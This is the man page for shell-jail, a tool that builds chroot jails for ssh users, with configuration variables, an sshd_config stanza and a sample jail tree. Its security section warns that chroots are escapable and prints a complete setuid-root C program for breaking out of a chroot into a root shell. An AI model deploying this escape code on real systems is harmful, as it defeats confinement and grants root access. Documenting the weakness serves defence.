---
title: shell-jail
section: 1
header: User manual
footer: shell-jail
author:
  - Sébastien Gross
date: 2016-02-25 15:22:10
adjusting: b
hyphenate: yes
---


# NAME

shell-jail - Easy chroot environment builder

# SYNOPSIS

shell-jail *config-file* *user*

# DESCRIPTION

*shell-jail* helps you easily create chroot environments. It was initially
written to create *ssh* jails.

First *shell-jail* reads the configuration file (see below for details) and
copies all required commands (and their dependencies) into the jail
directory. The jail directory is the user's home directory in the real file
system.

Then all *NSS* information (such as *password*, *shadow*) is copied into the
jail.

Finally all system-related files attributes are changed to immutable to
prevent any further modification.


# CONFIGURATION FILE

The configuration file (see below) contains all files you want to put in the
jail. the file consists of a *bash* compatible stanza which sets 3
variables: **COMMANDS**, **EXTRA** **EXTRA_FILES_DIRS**.

EXTRA
: Files from **EXTRA** variable are copied as it into the user's jail.

EXTRA_FILES_DIRS
: Directory from **EXTRA_FILES_DIRS** variable are copied as it into the
  user's jail in a relative way. For example files under */srv/extra/dir*
  are copied into *\<USER JAIL\>/*.

COMMANDS
: Every file defined in *COMMANDS* is copied into the user's jail. Then each
  file is scanned for its dependencies such as library (using ldd(1)) and
  devices (using strings(1)).


# SSH CONFIGURATION

In order to chroot a user the following stanza must be done for the given
user in */etc/ssh/sshd_config*:


````
Match User jdoe
    ChrootDirectory /home/jdoe
    X11Forwarding no
    AllowTcpForwarding no
````

When the user logs into the server he will be chrooted to */home/jdoe* which
structure looks like:

````
/home/jdoe
├── bin
│   ├── cat
│   ├── cp
│   ├── dash
│   ├── ls
│   ├── mkdir
│   ├── mv
│   ├── rm
│   └── sh -> /bin/dash
├── dev
│   ├── net
│   │   └── tun
│   ├── null
│   └── tty
├── etc
│   ├── group
│   └── passwd
├── lib
│   └── x86_64-linux-gnu
│       ├── libacl.so.1
│       ├── libattr.so.1
│       ├── libc.so.6
│       ├── libdl.so.2
│       ├── libnss_compat-2.19.so
│       ├── libnss_compat.so.2 -> libnss_compat-2.19.so
│       ├── libnss_files-2.19.so
│       ├── libnss_files.so.2 -> libnss_files-2.19.so
│       ├── libpcre.so.3
│       ├── libpopt.so.0
│       ├── libselinux.so.1
│       └── libz.so.1
├── lib64
│   └── ld-linux-x86-64.so.2
├── home
│   └── jdoe
│       └── USER'S FILES AND DIR
└── usr
    ├── bin
    │   ├── rsync
    │   └── scp
    └── lib
        └── openssh
            └── sftp-server
````


# SECURITY

It is relatively easy to escape from a chroot (see
https://filippo.io/escaping-a-chroot-jail-slash-1). So do not consider a
chroot as a ultimate security solution.

This simple C program can allow you to escape from the chroot as long as the
binary is owned by root and setuid to root.

````
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
 
int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");  
    return execl("/bin/sh", "-i", NULL);
}
````


# SEE ALSO

sshd_config(5), ldd(1), strings(1)

# BUGS

No time to include bugs, command actions might seldom lead astray user's
assumption.


# COPYRIGHT

Copyright © 2010-2016 Sébastien Gross \<seb•ɑƬ•chezwam•ɖɵʈ•org\>.

Relesed under WTFPL (http://sam.zoy.org/wtfpl/COPYING).
